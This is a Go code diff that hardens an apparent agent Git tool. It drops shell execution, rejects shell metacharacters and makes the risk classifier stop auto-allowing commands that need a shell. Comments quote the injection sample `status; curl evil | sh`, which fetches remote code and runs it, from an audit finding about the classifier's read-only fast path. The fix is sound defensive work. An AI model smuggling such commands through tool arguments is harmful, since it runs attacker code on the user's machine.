@@ -63,10 +63,21 @@ func (g *GitTool) Execute(ctx context.Context, input json.RawMessage) (*ToolExec
 		return ErrorResult("command is required"), nil
 	}
 
+	// Parse the command into argv without a shell. Rejects shell
+	// metacharacters up front (per WU-094 finding C-1 — the old
+	// `sh -c "git "+command` path let `status; curl evil | sh`
+	// through by classifying on fields[0] alone). No shell means no
+	// metacharacter interpretation, which also closes command
+	// substitution (`$(...)`, backticks) and env-var indirection.
+	args, err := parseGitArgs(*in.Command)
+	if err != nil {
+		return ErrorResult("%v", err), nil
+	}
+
 	execCtx, cancel := context.WithTimeout(ctx, g.defaultTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(execCtx, "sh", "-c", "git "+*in.Command)
+	cmd := exec.CommandContext(execCtx, "git", args...)
 	cmd.Dir = g.projectRoot
 	output, runErr := cmd.CombinedOutput()
 
@@ -85,6 +96,65 @@ func (g *GitTool) Execute(ctx context.Context, input json.RawMessage) (*ToolExec
 	}
 
 	return SuccessResult(truncated, "text"), nil
+}
+
+// gitMetacharacters are shell control characters the Git tool refuses
+// to accept. Anything in this set would require a shell to interpret;
+// since we run git directly via exec.Command (no shell), we also
+// reject them at parse time so a rejected command surfaces a clear
+// error rather than a mysterious git invocation failure.
+const gitMetacharacters = ";|&`$<>\n\r"
+
+// parseGitArgs splits a git command string into argv, preserving
+// double- and single-quoted segments so legitimate uses like
+// `commit -m "initial commit"` still work. Rejects inputs containing
+// shell metacharacters; those are always a shell-interpretation
+// attempt and have no legitimate use through this tool.
+func parseGitArgs(cmd string) ([]string, error) {
+	if strings.ContainsAny(cmd, gitMetacharacters) {
+		return nil, errors.New("git: command contains shell metacharacters; use Bash for shell pipelines")
+	}
+	var args []string
+	var cur strings.Builder
+	var inSingle, inDouble bool
+	flush := func() {
+		if cur.Len() > 0 {
+			args = append(args, cur.String())
+			cur.Reset()
+		}
+	}
+	for _, r := range cmd {
+		switch {
+		case inSingle:
+			if r == '\'' {
+				inSingle = false
+				continue
+			}
+			cur.WriteRune(r)
+		case inDouble:
+			if r == '"' {
+				inDouble = false
+				continue
+			}
+			cur.WriteRune(r)
+		case r == '\'':
+			inSingle = true
+		case r == '"':
+			inDouble = true
+		case r == ' ' || r == '\t':
+			flush()
+		default:
+			cur.WriteRune(r)
+		}
+	}
+	if inSingle || inDouble {
+		return nil, errors.New("git: unterminated quote")
+	}
+	flush()
+	if len(args) == 0 {
+		return nil, errors.New("git: empty command")
+	}
+	return args, nil
 }
 
 // gitReadCommands is the allow-list of subcommands that are safe
@@ -121,6 +191,12 @@ var positionalMutationSubs = map[string]bool{
 // ClassifyGit inspects a git command (without the "git" prefix) and
 // returns the risk level that should govern the invocation. Precedence:
 // destructive > mutation > read-only > execute (default).
+//
+// Commands containing shell metacharacters always classify as
+// RiskExecute regardless of the leading subcommand — the read-only
+// fast path must never auto-allow a command that would need a shell
+// (defense in depth against WU-094 C-1, which exploited exactly
+// this path via `status ; curl evil | sh`).
 func ClassifyGit(command string) RiskLevel {
 	trimmed := strings.TrimSpace(command)
 	if trimmed == "" {
@@ -128,6 +204,9 @@ func ClassifyGit(command string) RiskLevel {
 	}
 	if IsDangerousGit(trimmed) {
 		return RiskDestructive
+	}
+	if strings.ContainsAny(trimmed, gitMetacharacters) {
+		return RiskExecute
 	}
 
 	fields := strings.Fields(trimmed)
